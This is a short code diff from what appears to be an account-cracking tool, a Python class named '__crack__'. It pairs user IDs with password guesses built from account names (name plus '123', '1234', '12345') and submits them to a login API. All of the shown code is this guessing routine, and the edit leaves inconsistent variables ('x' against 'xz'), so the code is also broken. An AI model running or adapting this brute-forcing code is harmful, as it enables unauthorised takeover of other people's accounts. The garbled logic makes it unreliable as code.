@@ -113,10 +113,10 @@ class __crack__:
                 try:
                     uid, name = omen.split('<=>')
                     xz = name.split(' ')
-                    if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
+                    if len(x) == 3 or len(x) == 4 or len(x) == 5 or len(x) == 6:
                         pwx = [name, xz[0]+"123", x+"1234", x+"12345"]
                     else:
-                        pwx = [name, x+"123"]
+                        pwx = [name]
                     __nemoXD__.submit(self.__api__, uid, pwx)
                 except:
                     pass
